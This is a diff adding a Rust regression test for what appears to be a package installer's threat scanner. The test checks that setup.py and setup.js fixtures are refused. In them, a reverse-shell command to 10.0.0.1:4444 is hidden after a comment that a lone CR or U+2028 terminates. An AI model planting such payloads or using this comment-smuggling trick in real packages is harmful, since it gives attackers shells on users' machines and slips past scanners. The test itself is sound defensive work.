@@ -108,6 +108,34 @@ fn code_behind_another_languages_comment_marker_is_still_refused() {
 }
 
 #[test]
+fn code_after_an_interpreter_line_terminator_is_still_refused() {
+    // Regression: Python ends a line at a lone CR and JS at U+2028, so code
+    // after `# x\r` or `// x\u{2028}` runs; the scan lowered it as a comment
+    // and `--force` installed a reverse shell.
+    for (file, text) in [
+        (
+            "setup.py",
+            "# setup\rimport os; os.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
+        ),
+        (
+            "setup.js",
+            "// setup\u{2028}require(\"child_process\").execSync(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
+        ),
+    ] {
+        let home = temp_home();
+        let package = package(home.path(), &[(file, text)]);
+        let out = install(home.path(), &package, &["--force"]);
+        assert_eq!(out.status.code(), Some(77), "{file}: {}", stderr(&out));
+        assert!(
+            stderr(&out).contains("threat scan verdict dangerous"),
+            "{file}: {}",
+            stderr(&out)
+        );
+        assert!(!installed(home.path()), "{file}");
+    }
+}
+
+#[test]
 fn a_caution_verdict_needs_force_and_the_record_keeps_it() {
     // The same shell text in documentation is lowered to caution, but is
     // still reported.
